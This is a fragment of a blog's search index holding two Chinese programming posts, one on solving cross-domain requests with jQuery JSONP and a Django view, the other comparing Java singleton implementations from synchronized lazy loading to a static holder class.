class="markdownIt-Anchor" href="#采用jsonp解决跨域问题"></a> 采用jsonp解决跨域问题</h2><p>由于本人技术水平有限，也在网上找了许多方案，但是大多没有成功（主要自己太菜了），最后结合了多个博客的讲解以及尝试，最后使用jsonp成功解决了自己遇到的问题，不过写这篇博客距离当时解决所隔时间太长，无法列出当时帮助到自己的大神们，求谅解。<br></p><p>由于后台采用了Django，故后台使用Python进行演示，其他的后台框架仿照完成即可。</p><h3 id="前端"><a class="markdownIt-Anchor" href="#前端"></a> 前端</h3><p>代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">submitComment</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">'GET'</span>,</span><br><span class="line">        url: url,</span><br><span class="line">        data: $(<span class="string">"#forml"</span>).serialize(),</span><br><span class="line">        crossDomain: <span class="literal">true</span>,</span><br><span class="line">        dataType: <span class="string">'jsonp'</span>,</span><br><span class="line">        jsonp: <span class="string">'callback'</span>,</span><br><span class="line">        jsonpCallback: <span class="string">'callback'</span>,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span>(<span class="params">response</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(response);</span><br><span class="line">        &#125;,</span><br><span class="line">        error: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'Ajax error!'</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        complete: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"complete"</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上各参数详解：</p><table><thead><tr><th>参数名</th><th>参数类型</th><th>默认值</th><th>解析</th></tr></thead><tbody><tr><td>type</td><td>String</td><td>‘GET’</td><td>请求方式(‘POST’或’GET’)，其他HTTP请求方法，如PUT和DELETE也可使用，但是仅部分浏览器支持</td></tr><tr><td>url</td><td>String</td><td>当前页地址</td><td>发送请求地址</td></tr><tr><td>data</td><td>String</td><td></td><td>发送服务器的数据。将自动转换为请求字符串格式，其他详细解析课件w3school</td></tr><tr><td>crossDomain</td><td>Boolean</td><td>同域请求为false，跨域请求为true</td><td>若想在同一域内强制跨域请求(如jsonp形式)，例如，想让服务器重定向到另一个域，则需要将其设置为true</td></tr><tr><td>dataType</td><td>String</td><td></td><td>预期服务器返回的数据类型，详细可用值见下表</td></tr><tr><td>jsonp</td><td>String</td><td></td><td>在一个jsonp请求中重写回调函数的名字。这个值用来替代在&quot;callback=？&quot;这种GET或POST请求中的URL参数里的callback部分</td></tr><tr><td>jsonpCallback</td><td>String</td><td>jQuery自动生成的随机函数名</td><td>为jsonp请求指定回调函数名，用来取代自动生成的函数名，这样管理请求更容易，也能方便地提供回调函数和错误处理</td></tr><tr><td>success</td><td>Function</td><td></td><td>请求成功后的回调函数。有服务器返回，并根据dataType参数进行处理后的数据</td></tr><tr><td>error</td><td>Function</td><td></td><td>请求失败时调用此函数，具体可见w3school</td></tr><tr><td>complete</td><td>Function</td><td></td><td>请求完成后的回调函数(请求成功与失败都调用)，具体可见w3school</td></tr></tbody></table><p>dataType可用值表：</p><table><thead><tr><th>可用值</th><th>解析</th></tr></thead><tbody><tr><td>xml</td><td>返回XML文档，可用jQuery处理</td></tr><tr><td>html</td><td>返回纯文本HTML信息</td></tr><tr><td>script</td><td>返回纯文本JavaScript代码，不会自动缓存结果</td></tr><tr><td>json</td><td>返回json数据</td></tr><tr><td>jsonp</td><td>jsonp格式数据。使用JSONP形式调用函数时，如&quot;myurl?callback=?&quot;jQuery将自动替换?为正确的函数名，以执行回调函数</td></tr><tr><td>text</td><td>返回纯文本字符串</td></tr></tbody></table><p><strong>注意：</strong></p><ul><li>由于采用跨域请求，不管我们如何设置<code>type</code>参数，请求方式一定为<code>GET</code></li><li>开始调试时，每次在控制台都可以看到response，但是<code>success</code>的function就是没有调用，每次都是调用了<code>error</code>和<code>complete</code>的function，后来网上一直查，最终发现后台也需要相应的配合</li><li>由于不太明白<code>jsonp</code>与<code>jsonpCallback</code>参数的用法，所以直接将两个参数值赋一样的值</li></ul><h3 id="django后台"><a class="markdownIt-Anchor" href="#django后台"></a> Django后台</h3><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_shop_comment</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="comment"># 以下是一些从请求中取出参数的操作</span></span><br><span class="line">    省略......</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = dict()</span><br><span class="line">        result[<span class="string">"returnInfo"</span>] = <span class="number">1</span></span><br><span class="line">        comment_list = list()</span><br><span class="line">        <span class="comment"># 以下代码是将数据库的操作，查到后append到comment_list里</span></span><br><span class="line">        省略......</span><br><span class="line">        result[<span class="string">"data"</span>] = comment_list</span><br><span class="line">        return_result = json.dumps(result)</span><br><span class="line">        data = <span class="string">'%s(%s);'</span> % (<span class="string">'callback'</span>, return_result)</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(data, <span class="string">'text/javascript'</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        data = <span class="string">'%s(%s);'</span> % (<span class="string">'callback'</span>, &#123;<span class="string">'result'</span>: e.message&#125;)</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(data, <span class="string">'text/javascript'</span>)</span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><ul><li>跨域请求方式都是<code>GET</code></li><li>返回一定要用HttpResponse，不能使用JsonResponse</li><li>开始当只有返回一个参数时，并没用使用<code>json.dumps()</code>方法，前台可以正常调用<code>success</code>的方法。后来当有多个参数时，前台就一直调用<code>error</code>和<code>complete</code>的方法，后来自己尝试使用了dumps之后，发现就正常了</li></ul><h2 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> 参考资料</h2><ul><li><a href="http://www.w3school.com.cn/jquery/ajax_ajax.asp" target="_blank" rel="noopener">W3school的《jQuery ajax - ajax() 方法》</a></li><li><a href="http://www.cnblogs.com/rainman/archive/2011/02/20/1959325.html" target="_blank" rel="noopener">Rain Man的《JavaScript跨域总结与解决办法》</a></li><li><a href="https://my.oschina.net/jasonultimate/blog/550737" target="_blank" rel="noopener">一条大河波浪宽的《ajax跨域请求原理及解决方案分析》</a></li><li><a href="https://segmentfault.com/a/1190000002799156" target="_blank" rel="noopener">别天的《JSONP原理及实现跨域方式》</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>单例模式</title>
      <link href="/singleton-mode/"/>
      <url>/singleton-mode/</url>
      
        <content type="html"><![CDATA[<h2 id="单例模式的特点"><a class="markdownIt-Anchor" href="#单例模式的特点"></a> 单例模式的特点</h2><ul><li>单例类只能有一个实例</li><li>单例类必须创建自己唯一的实例</li><li>单例类必须给其他对象提供这一实例</li></ul><h2 id="饿汉-vs-懒汉"><a class="markdownIt-Anchor" href="#饿汉-vs-懒汉"></a> 饿汉 vs 懒汉</h2><ul><li>饿汉：声明实例引用时即实例化</li><li>懒汉：静态方法第一次被调用前不实例化，也即懒加载。对于创建实例代价大，且不定会使用时，使用懒加载可以减少开销</li></ul><h2 id="解决方案"><a class="markdownIt-Anchor" href="#解决方案"></a> 解决方案</h2><h3 id="在多线程环境中能工作但是效率不高不建议面试采用懒汉"><a class="markdownIt-Anchor" href="#在多线程环境中能工作但是效率不高不建议面试采用懒汉"></a> 在多线程环境中能工作，但是效率不高，不建议面试采用（懒汉）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton1</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Singleton1 &#123;&#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton1 instance;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Singleton1 <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            instance = <span class="keyword">new</span> Singleton1();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>优点：线程安全，可确保正常使用（不考虑通过反射调用私有构造方法），只有一个实例</li><li>缺点：每次获取实例都需要申请锁，开销大，效率低</li></ul><h3 id="加同步锁前后两次判断实例是否存在懒汉"><a class="markdownIt-Anchor" href="#加同步锁前后两次判断实例是否存在懒汉"></a> 加同步锁前后两次判断实例是否存在（懒汉）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton2</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton2 instance;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton2 <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(Singleton2<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> Singleton2();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>优点：不需要在每次调用时加锁，效率比上一个高</li><li>缺点：虽然使用了<code>synchronized</code>，但本质上是线程不安全的</li></ul><h3 id="双重检查double-check下的懒汉"><a class="markdownIt-Anchor" href="#双重检查double-check下的懒汉"></a> 双重检查（Double Check）下的懒汉</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton3</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Singleton3 instance;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton3</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton3 <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(Singleton3<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> Singleton3();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>优点：使用了双重检查，避免了线程不安全，同时避免了不必要的锁开销</li><li>缺点：无</li><li><strong>注意：使用<code>volatile</code>关键字的目的不是保证可见性（<code>synchronized</code>已经保证了可见性），而是为了保证顺序性。具体来说，<code>instance = new Singleton3()</code>不是原子操作，实际上被拆分为了三步：1) 分配内存；2) 初始化对象；3) 将<code>instance</code>指向分配的对象内存地址。 如果没有<code>volatile</code>，可能会发生指令重排序，使得<code>instance</code>先指向内存地址，而对象尚未初始化，其它线程直接使用<code>instance</code>引用进行对象操作时出错。详细原理可参见《<a href="http://www.infoq.com/cn/articles/double-checked-locking-with-delay-initialization" target="_blank" rel="noopener" title="双重检查锁定与延迟初始化">双重检查锁定与延迟初始化</a>》</strong></li></ul><h3 id="利用静态变量饿汉"><a class="markdownIt-Anchor" href="#利用静态变量饿汉"></a> 利用静态变量（饿汉）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton4</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton4</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton4 instance = <span class="keyword">new</span> Singleton4();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton4 <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>优点：实现简单，无线程同步问题</li><li>缺点：在类装载时完成实例化。若该实例一直未被使用，则会造成资源浪费</li></ul><h3 id="利用静态代码块饿汉"><a class="markdownIt-Anchor" href="#利用静态代码块饿汉"></a> 利用静态代码块（饿汉）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton5</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton5 instance;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton5</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        instance = <span class="keyword">new</span> Singleton5();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton5 <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>优点：实现简单，无线程同步问题</li><li>缺点：在类装载时完成实例化。若该实例一直未被使用，则会造成资源浪费</li></ul><h3 id="实现按需创建实例强烈推荐懒汉"><a class="markdownIt-Anchor" href="#实现按需创建实例强烈推荐懒汉"></a> 实现按需创建实例（强烈推荐）（懒汉）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton6</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton6</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Nested</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> Singleton6 instance = <span class="keyword">new</span> Singleton6();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton6 <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Nested.instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>优点：无线程同步问题，实现了懒加载。因为只有调用<code>getInstance()</code>时才会装载内部类，才会创建实例。同时因为使用内部类，先调用内部类的线程会获得类初始化锁，从而保证内部类的初始化（包括实例化它所引用的外部类对象）线程安全。即使内部类创建外部类的实例<code>Singleton6 instance = new Singleton6()</code>发生指令重排也不会引起双重检查下的懒汉模式中提到的问题，因此无须使用<code>volatile</code>关键字。</li><li>缺点：无</li></ul><h2 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> 参考资料</h2><hr /><ul><li><a href="http://www.cnblogs.com/java-my-life/archive/2012/03/31/2425631.html" target="_blank" rel="noopener">java_my_life的《JAVA与模式》之单例模式</a></li><li><a href="http://www.jasongj.com/design_pattern/singleton/" target="_blank" rel="noopener">技术世界的Java设计模式（十） 你真的用对单例模式了吗？</a></li><li><a href="http://www.infoq.com/cn/articles/double-checked-locking-with-delay-initialization" target="_blank" rel="noopener">InfoQ的双重检查锁定与延迟初始化<br /></a></li><li>《剑指offer》（第二版）</li></ul>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
